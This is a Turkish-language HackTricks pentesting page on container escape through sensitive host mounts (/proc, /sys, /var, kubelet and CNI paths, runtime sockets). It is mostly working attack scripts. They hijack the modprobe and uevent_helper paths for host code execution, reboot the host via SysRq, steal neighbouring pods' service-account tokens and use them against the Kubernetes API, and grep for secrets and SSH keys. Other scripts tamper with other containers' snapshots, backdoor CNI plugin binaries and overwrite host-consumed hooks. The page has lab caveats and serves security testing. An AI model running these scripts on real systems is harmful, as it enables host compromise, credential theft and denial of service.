# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatle yalıtılmış bir process görünümünü doğrudan host kaynaklarının görünürlüğüne geri döndürebildikleri için en önemli pratik container-escape yüzeylerinden biridir. Tehlikeli durumlar `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socket'leri, kubelet tarafından yönetilen state veya device ile ilişkili path'lerin bind mount edilmesi; kernel kontrollerini, kimlik bilgilerini, komşu container filesystem'larını ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, abuse modelinin farklı alanları kapsaması nedeniyle tek tek protection sayfalarından ayrı olarak oluşturulmuştur. Writable bir host mount; kısmen mount namespace'leri, kısmen user namespace'leri, kısmen AppArmor veya SELinux kapsamı ve kısmen de açığa çıkarılan kesin host path nedeniyle tehlikelidir. Bunu ayrı bir konu olarak ele almak attack surface'i anlamayı çok daha kolaylaştırır.

## `/proc` Exposure

procfs hem sıradan process bilgilerini hem de yüksek etkili kernel kontrol arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik writable proc entry'lerini açığa çıkaran bir container görünümü; information disclosure, denial of service veya doğrudan host code execution ile sonuçlanabilir.

Yüksek değerli procfs path'leri şunlardır:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (özellikle `register` ve `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Hangi yüksek değerli procfs entry'lerinin görünür veya writable olduğunu kontrol ederek başlayın:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Bu yollar farklı nedenlerle ilgi çekicidir. `core_pattern`, `modprobe` ve `binfmt_misc`, yazılabilir olduklarında host üzerinde code execution yollarına dönüşebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz`, kernel exploitation için güçlü reconnaissance kaynaklarıdır. `sched_debug` ve `mountinfo`, container içinden host yerleşimini yeniden oluşturmaya yardımcı olabilecek process, cgroup ve filesystem context bilgilerini açığa çıkarır.

Her yolun pratik değeri farklıdır ve hepsini aynı etkiye sahipmiş gibi değerlendirmek triage işlemini zorlaştırır:

- `/proc/sys/kernel/core_pattern`
Yazılabilirse bu, en yüksek etkili procfs yollarından biridir; çünkü kernel bir crash sonrasında pipe handler çalıştırır. `core_pattern` değerini overlay içinde veya mount edilmiş bir host path içinde bulunan bir payload'a yönlendirebilen bir container, çoğu zaman host üzerinde code execution elde edebilir. Ayrılmış bir örnek için [read-only-paths.md](protections/read-only-paths.md) dosyasına da bakın.
- `/proc/sys/kernel/modprobe`
Bu path, kernel'in module-loading logic'i çağırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Container içinden yazılabilir durumdaysa ve host context içinde yorumlanıyorsa başka bir host code-execution primitive'ine dönüşebilir. Helper path'ini tetikleyebilecek bir yöntemle birleştirildiğinde özellikle ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Bu genellikle temiz bir escape primitive değildir; ancak OOM koşullarını kernel panic davranışına dönüştürerek memory pressure'ı host genelinde denial of service durumuna çevirebilir.
- `/proc/sys/fs/binfmt_misc`
Registration interface yazılabilirse attacker, seçilen bir magic value için handler kaydedebilir ve eşleşen bir file execute edildiğinde host context içinde execution elde edebilir.
- `/proc/config.gz`
Kernel exploit triage için kullanışlıdır. Host package metadata'sına ihtiyaç duymadan hangi subsystem'lerin, mitigation'ların ve isteğe bağlı kernel feature'larının etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla denial-of-service path'idir, ancak çok ciddi bir path'tir. Host'u hemen reboot edebilir, panic'e sokabilir veya başka şekilde bozabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting, crash analysis ve bazı ortamlarda kernel exploitation için yararlı bilgilerin leak edilmesi açısından kullanışlıdır.
- `/proc/kallsyms`
Okunabilir olduğunda değerlidir; çünkü exported kernel symbol bilgilerini açığa çıkarır ve kernel exploit geliştirme sırasında address randomization varsayımlarını aşmaya yardımcı olabilir.
- `/proc/[pid]/mem`
Bu, doğrudan process-memory interface'idir. Hedef process'e gerekli ptrace-style koşullarla erişilebiliyorsa başka bir process'in memory'sini okumaya veya değiştirmeye izin verebilir. Gerçek etkisi credentials, `hidepid`, Yama ve ptrace restrictions'a büyük ölçüde bağlıdır; bu nedenle güçlü ancak koşula bağlı bir path'tir.
- `/proc/kcore`
System memory'nin core-image-style bir görünümünü açığa çıkarır. File çok büyük ve kullanımı zahmetlidir; ancak anlamlı biçimde okunabiliyorsa host memory surface'inin ciddi şekilde açığa çıktığını gösterir.
- `/dev/kmem` ve `/dev/mem`
Bunlar procfs file'ları değil, tarihsel olarak yüksek etkili raw-memory **device** interface'leridir. Birçok modern system'de bulunmaz veya ciddi biçimde kısıtlanır; ancak bir container host-mounted bir kopyayı açabiliyorsa exposure kritik kabul edilmelidir. Bunları mevcut olmayan `/proc/kmem` veya `/proc/mem` path'lerini aramak yerine diğer hassas `/dev` mount'larıyla birlikte inceleyin.
- `/proc/sched_debug`
Scheduling ve task bilgilerini leak eder; bu bilgiler, diğer process görünümleri beklenenden daha temiz görünse bile host process kimliklerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
Container'ın host üzerinde gerçekte nerede bulunduğunu, hangi path'lerin overlay-backed olduğunu ve yazılabilir bir mount'ın host içeriğine mi yoksa yalnızca container layer'ına mı karşılık geldiğini yeniden oluşturmak için son derece kullanışlıdır.

`/proc/[pid]/mountinfo` veya overlay ayrıntıları okunabiliyorsa bunları kullanarak container filesystem'inin host path'ini kurtarın:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar kullanışlıdır; çünkü çeşitli host-execution teknikleri, container içindeki bir path'in host perspektifinden karşılık gelen path'e dönüştürülmesini gerektirir.

### Örnek: Bir `modprobe` Helper Path'i Hazırlama

`/proc/sys/kernel/modprobe` container içinden yazılabilirse ve helper path host context içinde yorumlanırsa, attacker-controlled bir payload'a yönlendirilebilir. Overlay upper directory host üzerinden çözümlenmeli ve container host `/tmp`'yi de mount etmiyorsa proof output aynı host-visible container layer'a geri yazılmalıdır:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Kesin tetikleyici hedefe ve kernel davranışına bağlıdır ve kasıtlı olarak tahmin edilmemiştir. Lab'den ayrılmadan önce orijinal değeri geri yükleyin. Önemli nokta, yazılabilir bir helper path'in gelecekteki bir kernel helper invocation işlemini attacker-controlled host-path içeriğine yönlendirebilmesidir. Eksik bir overlay `upperdir`, host'un çözemediği bir path, salt okunur bir sysctl mount'u veya seçilen helper'ı hiç çağırmayan bir kernel bu zinciri bozar.

### Full Example: `kallsyms`, `kmsg` ve `config.gz` ile Kernel Recon

Amaç doğrudan escape yerine exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, yararlı symbol bilgilerinin görünür olup olmadığını, en son kernel mesajlarının ilginç bir durum açığa çıkarıp çıkarmadığını ve hangi kernel özelliklerinin veya mitigations özelliklerinin derlenmiş olduğunu anlamaya yardımcı olur. Etki genellikle doğrudan escape değildir, ancak kernel vulnerability triage sürecini önemli ölçüde kısaltabilir.

### Tam Örnek: SysRq Host Reboot

`/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne ulaşıyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etki, host'un derhal yeniden başlatılmasıdır. Bu, incelikli bir örnek değildir; ancak procfs exposure'ın information disclosure'dan çok daha ciddi olabileceğini açıkça gösterir.

## `/sys` Exposure

sysfs, büyük miktarda kernel ve device state bilgisini açığa çıkarır. Bazı sysfs yolları esas olarak fingerprinting için kullanışlıyken, diğerleri helper execution, device behavior, security-module configuration veya firmware state'i etkileyebilir.

Yüksek değerli sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, thermal-management behavior'ı ve dolayısıyla kötü şekilde expose edilmiş ortamlarda host stability'yi etkileyebilir. `/sys/kernel/vmcoreinfo`, low-level host fingerprinting'e yardımcı olan crash-dump ve kernel-layout bilgilerini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; bu nedenle buradaki beklenmeyen erişim, MAC ile ilgili state'i expose edebilir veya değiştirebilir. EFI variable yolları, firmware-backed boot settings'ı etkileyebilir ve bu da onları sıradan configuration file'lardan çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs`, özellikle tehlikelidir; çünkü hardened production-facing kernel API'lerine kıyasla çok daha az safety beklentisi olan, kasıtlı olarak developer-oriented bir arayüzdür.

Bu listedeki her sysfs entry'si **kernel-, configuration- ve hardware-dependent** durumdadır. Güncel virtualized node'lar genellikle `uevent_helper`, EFI variables ve thermal-device entry'lerini tamamen içermez. Olmayan bir yolu, başka bir kernel'dan alınan bir örneğin geçerli olduğunu varsaymak yerine negative prerequisite olarak kaydedin.

Bu yollar için kullanışlı review command'ları şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Bunları ilginç kılan nedir:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin yalnızca host üzerinde kalması gerekirken görünür olup olmadığını açığa çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgudur. `debugfs` mount edilmiş ve okunabilir veya yazılabilir durumdaysa, etkinleştirilmiş debug düğümlerine bağlı olarak kesin riski değişen, kernel'e yönelik geniş bir yüzey bekleyin.
- EFI değişkenlerinin açığa çıkması daha az yaygındır; ancak olağan runtime dosyaları yerine firmware destekli ayarlara dokunduğu için etkisi yüksektir.
- `/sys/class/thermal`, düzenli bir shell-style escape için değil, esas olarak host kararlılığı ve donanımla etkileşim açısından önemlidir.
- `/sys/kernel/vmcoreinfo`, temel olarak host fingerprinting ve crash analysis kaynağıdır; düşük seviyeli kernel durumunu anlamak için kullanışlıdır.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper`, kernel ve configuration'a bağlıdır ve güncel sistemlerin çoğunda bulunmaz. Varsa, yazılabilir durumdaysa ve kullanılabilir bir `uevent` trigger mevcutsa kernel, attacker-controlled bir helper çalıştırabilir. Proof output, hem host hem de container görünümlerinden görünür olan bir path kullanmalıdır:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container'ın içinde değil, host context'inde çalışır. `/sys/class/mem/null/uevent`, bunu sunan kernel'larda somut bir tetikleyicidir; diğer cihazlar kendi `uevent` dosyalarını sunabilir, ancak gerçek donanım üzerinde birini gelişigüzel seçmeyin. Lab'dan ayrılmadan önce orijinal değeri geri yükleyin. Helper dosyası veya kontrol edilen bir tetikleyici mevcut değilse bu tekniği kullanılabilir olarak bildirmeyin.

## `/var` Exposure

Host'un `/var` dizininin bir container'a mount edilmesi, `/` mount edilmesi kadar çarpıcı görünmediği için genellikle hafife alınır. Pratikte bu, runtime socket'lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume'larına, projected service-account token'larına ve komşu uygulama filesystem'lerine erişmek için yeterli olabilir. Modern node'larda `/var`, çoğu zaman operasyon açısından en ilgi çekici container state'inin gerçekte bulunduğu yerdir.

### Kubernetes Example

`hostPath: /var` içeren bir pod, çoğu zaman diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar, mount'ın yalnızca önemsiz uygulama verilerini mi yoksa yüksek etkili cluster kimlik bilgilerini mi açığa çıkardığını belirlemek için kullanışlıdır. Okunabilir bir service-account token'ı, yerel code execution'ı doğrudan Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, yalnızca token keşfinde durmak yerine erişebildiği şeyleri doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki, yerel node erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token, mount edilmiş bir `/var` yolunu cluster genelinde compromise için kullanabilir.

### Docker ve containerd Örneği

Docker host'larında ilgili veriler genellikle `/var/lib/docker` altında bulunurken, containerd-backed Kubernetes node'larında `/var/lib/containerd` veya snapshotter-specific path'ler altında bulunabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Bağlanan `/var`, başka bir workload'un yazılabilir snapshot içeriğini açığa çıkarıyorsa saldırgan; mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya başlangıç script'lerini değiştirebilir.

**Disposable bir lab workload'unda**, yazılabilir snapshot içeriği uygulama kurcalamasını, secret kurtarmayı veya lateral movement'ı gösterebilir. Önce runtime container ID'sini tam snapshot ile eşleştirin ve ilgisiz veya production snapshot'ını asla düzenlemeyin:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Bu komutlar kullanışlıdır; çünkü mount edilmiş `/var` için üç ana etki kategorisini gösterir: application tampering, secret kurtarma ve komşu workload'lara lateral movement.

Doğrudan snapshot yazımları, runtime'ın normal state yönetimini bypass edebilir ve container'ı bozabilir veya kanıtları yok edebilir. Read-only discovery, Docker `overlay2` üzerinde yerel olarak yeniden üretildi: komşu bir disposable container'a yazılan marker, `/var/lib/docker/overlay2/<id>/diff/` altında göründü. Gerçek snapshot değişikliklerini, bu test için oluşturulmuş disposable bir container ile sınırlı tutun.

## Kubelet State, Plugins And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount'ları genellikle privileged DaemonSet'ler, CNI agent'ları, CSI node plugin'leri, GPU operator'ları ve storage helper'ları aracılığıyla açığa çıkar. Bu mount'ları "node plumbing" olarak göz ardı etmek kolaydır; ancak bunlar yeni pod'ların execution path'i üzerinde doğrudan bulunur ve çoğu zaman kubelet credentials, projected secret'lar, registration socket'leri ve executable host-side plugin binary'leri içerir.

Yüksek değerli hedefler şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Kullanışlı inceleme komutları şunlardır:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Bu yollar neden önemlidir:

- `/var/lib/kubelet/pki`, kubelet client sertifikalarını ve diğer node-local kimlik bilgilerini açığa çıkarabilir; bunlar cluster tasarımına bağlı olarak API server'a veya kubelet-facing TLS endpoint'lerine karşı yeniden kullanılabilir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`, genellikle aynı node üzerindeki komşu pod'lar için projected service-account token'ları ve mount edilmiş Secret'lar içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` esas olarak bir reconnaissance yüzeyidir, ancak çok faydalıdır: hangi pod ve container'ların GPU'lara, hugepage'lere, SR-IOV cihazlarına ve diğer kıt node-local kaynaklara sahip olduğunu gösterir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugin'lerinin kurulu olduğunu ve kubelet'in hangi socket'lerle iletişim kurmasının beklendiğini gösterir. Bu dizinler yalnızca okunabilir değil de yazılabilir durumdaysa bulgu çok daha ciddi hale gelir.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` ve `/etc/cni/net.d`, pod-network kurulum yolunun doğrudan üzerinde yer alır. Buradaki yazma erişimi, yalnızca configuration exposure olmaktan ziyade genellikle gecikmeli bir host üzerinde kod çalıştırma primitive'idir.<sup>[[2]](#references)</sup>

### Full Example: Yazılabilir `/opt/cni/bin`

Bir host CNI binary dizini read-write olarak mount edilmişse, bir plugin'i değiştirmek, kubelet bu node üzerinde bir pod sandbox'ı bir sonraki oluşturduğunda host üzerinde kod çalıştırmak için yeterli olabilir:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Bu, bağlı bir `docker.sock` kadar doğrudan değildir; ancak ele geçirilmiş Kubernetes infrastructure pod'larında genellikle daha gerçekçidir. Marker, bağlı plugin'in yanına yazılır; böylece container, host-root veya host-`/tmp` mount'u olmadan bile marker'ı alabilir. Wrapper, orijinal argümanları ve standard input'u korur; ardından örnek, orijinal binary'yi geri yükler. Önemli nokta, değiştirilmiş binary'nin mevcut container tarafından değil, daha sonra host network setup flow tarafından çalıştırılmasıdır. Yalnızca disposable bir node kullanın; geçersiz bir wrapper, yeni Pod sandbox'larının networking almasını engelleyebilir.

## Runtime Sockets

Sensitive host mount'ları, tam dizinler yerine çoğu zaman runtime socket'lerini içerir. Bunlar, burada açıkça tekrar edilmeyi gerektirecek kadar önemlidir:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu socketlerden biri mount edildiğinde kapsamlı exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

İlk hızlı etkileşim pattern'i olarak:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Bunlardan biri başarılı olursa, "mounted socket"tan "daha ayrıcalıklı bir sibling container başlatma"ya giden yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

## Writable Host Path Task Hijack

Writable bir host mount'unun tehlikeli olması için `/` yolunu açığa çıkarması gerekmez. Mount edilen yol; script'ler, config dosyaları, hook'lar, plugin'ler veya daha sonra host-side scheduled task ya da service tarafından kullanılan dosyalar içeriyorsa container, host'un ne çalıştıracağını değiştirebilir.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Yazılabilir bir dosya bir host process tarafından kullanılıyorsa, test sırasında payload'ı basit ve gözlemlenebilir tutun:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
İlginç kısım trust boundary'dir: write işlemi container'ın içinden gerçekleşir, ancak execution daha sonra host service context içinde gerçekleşir. Bu durum, dar kapsamlı bir hostPath veya bind mount'ı gecikmeli host-code-execution primitive'ine dönüştürür.

## Mount-Related CVEs

Host mount'ları runtime zafiyetleriyle de kesişir. Önemli güncel örnekler şunlardır:

- `runc` içindeki `CVE-2024-21626`; burada sızdırılan bir directory file descriptor, working directory'nin host filesystem üzerinde konumlandırılmasına olanak sağlayabiliyordu.
- BuildKit içindeki `CVE-2024-23651`, `CVE-2024-23652` ve `CVE-2024-23653`; burada kötü amaçlı Dockerfile'lar, frontend'ler ve `RUN --mount` akışları build sırasında host file access, deletion veya elevated privileges durumlarını yeniden ortaya çıkarabiliyordu.
- Buildah ve Podman build akışlarındaki `CVE-2024-1753`; burada build sırasında hazırlanmış bind mount'lar `/` yolunu read-write olarak açığa çıkarabiliyordu.
- `containerd` 2.1.0 içindeki `CVE-2025-47290`; burada image unpack sırasında gerçekleşen bir TOCTOU, özel olarak hazırlanmış bir image'ın pull sırasında host filesystem'ini değiştirmesine olanak sağlayabiliyordu.

Bu CVE'ler burada önemlidir; çünkü mount işlemlerinin yalnızca operator configuration ile ilgili olmadığını gösterirler. Runtime'ın kendisi de mount kaynaklı escape koşulları oluşturabilir.

## Checks

En yüksek değerli mount açıklarını hızlıca konumlandırmak için şu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Burada ilgi çekici olanlar:

- Host root, `/proc`, `/sys`, `/var` ve runtime socket'lerinin tümü yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri çoğu zaman mount'ın güvenli bir container görünümü yerine host-geneli kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları yalnızca dosya sistemi incelemesini değil, credential'ların ve komşu workload'ların da incelenmesini gerektirir.
- Kubelet state dizinleri ve CNI/plugin yolları, runtime socket'leriyle aynı önceliğe sahiptir; çünkü bunlar çoğu zaman doğrudan node'un pod oluşturma ve credential dağıtma yolunda bulunur.

## Local Validation Status

Bu sayfadaki pratik chain'ler yerel bir Linux minikube node'u üzerinde kontrol edilmiştir. Validation şu sonuçları yeniden üretmiştir:

- Geçici bir yazılabilir hostPath üzerinden read ve write erişimi
- `/var/lib/kubelet/pods` üzerinden projected ServiceAccount token'larının ve mount edilmiş Secret'ların keşfi
- Bu mount edilmiş kubelet state içinden elde edilen canlı bir token ile başarılı Kubernetes API authentication
- Mount edilmiş `/var` üzerinden komşu bir Docker `overlay2` dosya sisteminin read-only keşfi
- Mount edilmiş bir `docker.sock` üzerinden read-only host bind içeren kardeş bir container'ın Docker API ile oluşturulması
- Geçici bir host-consumed hook üzerinden gecikmeli host execution
- Orijinal plugin'in argümanlarını, standard input'unu ve execution'ını koruyan bir CNI-wrapper simulation

Aynı node `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` ve `config.gz` dosyalarını açığa çıkardı; ancak `uevent_helper`, EFI variables, thermal entries veya `sched_debug` dosyalarını açığa çıkarmadı. Destructive kernel trigger'ları çalıştırılmadı. Bu durum host-root, `/var`, kubelet-state, socket ve host-consumer chain'lerinin yeniden üretilebilir olduğunu; procfs/sysfs helper tekniklerinin ise tam kernel'e, mount mode'a, payload path'ine ve trigger'a bağlı olarak koşullu kalması gerektiğini doğrular.

## References

- [1] [Kubelet Tarafından Kullanılan Local Files And Paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
